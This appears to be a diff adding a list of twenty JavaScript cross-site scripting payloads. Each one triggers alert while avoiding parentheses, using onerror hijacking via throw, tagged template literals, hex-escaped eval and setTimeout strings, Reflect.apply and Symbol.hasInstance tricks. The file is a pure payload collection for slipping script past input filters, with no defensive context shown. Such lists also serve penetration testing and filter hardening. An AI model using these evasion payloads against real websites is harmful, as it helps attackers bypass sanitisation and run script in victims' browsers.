@@ -1,0 +1,20 @@
+window.valueOf=alert;window+1
+onerror=alert;throw 'foo'
+throw onerror=alert,1337
+eval("onerror=\u2028alert\u2029throw 1337");
+throw onerror=alert,1,2,3,4,5,6,7,8,9,10
+try{throw onerror=alert}catch{throw 1337}
+alert`1337`
+`${alert(1337)}`
+`${`${alert(1337)}`}`
+alert`foobar`
+alert`foo${1}bar`
+eval`alert\x281337\x29`
+setTimeout`alert\x281337\x29`
+x`${'foo'}${'bar'}${'baz'}`
+Function`x${'alert\x281337\x29'}```
+'a,'.replace`a${alert}`
+'a'.replace.call`1${/./}${alert}`
+Reflect.apply.call`${alert}${window}${[1337]}`
+'alert\x281337\x29'instanceof{[Symbol['hasInstance']]:eval}
+'alert\x281337\x29'instanceof{[Symbol.hasInstance]:eval}
